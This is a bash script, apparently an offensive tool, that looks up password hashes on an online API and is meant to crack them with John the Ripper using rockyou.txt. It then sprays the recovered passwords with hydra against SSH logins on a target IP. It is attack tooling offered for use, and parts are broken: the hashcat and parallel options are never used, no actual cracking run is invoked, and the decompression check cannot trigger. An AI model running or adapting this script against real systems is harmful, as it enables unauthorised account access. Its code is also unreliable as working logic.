#!/bin/bash

# Default wordlist location
DEFAULT_WORDLIST="/usr/share/wordlists/rockyou.txt"

# Function to display usage
usage() {
    echo "Usage: $0 -h <hash> [-w <wordlist>] [-f <file_with_hashes>] [-t <target_ip>]"
    echo "  -h  Provide the hash to crack"
    echo "  -w  (Optional) Specify a custom wordlist (default: rockyou.txt)"
    echo "  -f  (Optional) File containing multiple hashes"
    echo "  -t  (Optional) Target IP for credential spraying"
    echo "  --hashcat  Use Hashcat instead of John for GPU cracking"
    echo "  --parallel  Use multi-threading for faster cracking"
    echo "  --spray <userlist>  Perform credential spraying with cracked passwords"
    exit 1
}

# Check if required tools are installed
check_tools() {
    for tool in john hashid curl jq; do
        if ! command -v $tool &> /dev/null; then
            echo "Error: $tool is not installed. Please install it and try again."
            exit 1
        fi
    done
}

# Parse command-line arguments
SPRAY_MODE=0
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -h) HASH_INPUT="$2"; shift ;;
        -w) WORDLIST="$2"; shift ;;
        -f) HASH_FILE="$2"; shift ;;
        --hashcat) USE_HASHCAT=1 ;;
        --parallel) USE_PARALLEL=1 ;;
        --spray) SPRAY_MODE=1; USERLIST="$2"; shift ;;
        -t) TARGET_IP="$2"; shift ;;  # <-- Added target IP argument
        *) usage ;;
    esac
    shift
done

# Ensure at least one hash source is provided
if [[ -z "$HASH_INPUT" && -z "$HASH_FILE" ]]; then
    usage
fi

# Use the provided wordlist or default to rockyou.txt
WORDLIST=${WORDLIST:-$DEFAULT_WORDLIST}

# Ensure the wordlist exists
if [[ ! -f "$WORDLIST" ]]; then
    echo "Error: Wordlist file '$WORDLIST' not found!"
    exit 1
fi

# Extract rockyou.txt if still compressed
if [[ "$WORDLIST" == "$DEFAULT_WORDLIST.gz" ]]; then
    echo "Extracting rockyou.txt..."
    gunzip "$WORDLIST"
fi

# Check required tools
check_tools

# Function to check hash in an online database
lookup_hash_online() {
    local hash=$1
    echo "[*] Checking online database for hash: $hash..."
    
    RESPONSE=$(curl -s "https://api.hashlookup.com/?hash=$hash" | jq -r '.password')

    if [[ -n "$RESPONSE" && "$RESPONSE" != "null" ]]; then
        echo "[+] Password found online: $RESPONSE"
        exit 0
    else
        echo "[-] Hash not found online, proceeding to brute-force..."
    fi
}

# If a single hash is provided, check online first
if [[ -n "$HASH_INPUT" ]]; then
    lookup_hash_online "$HASH_INPUT"
    echo "$HASH_INPUT" > single_hash.txt
    HASH_FILE="single_hash.txt"
fi

# If credential spraying is enabled, check if a target IP was provided
if [[ $SPRAY_MODE -eq 1 ]]; then
    if [[ -z "$TARGET_IP" ]]; then
        echo "[-] Error: Target IP not specified for credential spraying. Use -t <target_ip>."
        exit 1
    fi
    
    echo "[*] Running credential spraying with cracked passwords on target: $TARGET_IP..."
    PASSWORDS=$(john --show "$HASH_FILE" | awk -F: '{print $2}')
    
    for pass in $PASSWORDS; do
        echo "[*] Testing password: $pass against SSH login at $TARGET_IP..."
        hydra -L "$USERLIST" -p "$pass" ssh://$TARGET_IP
    done
fi
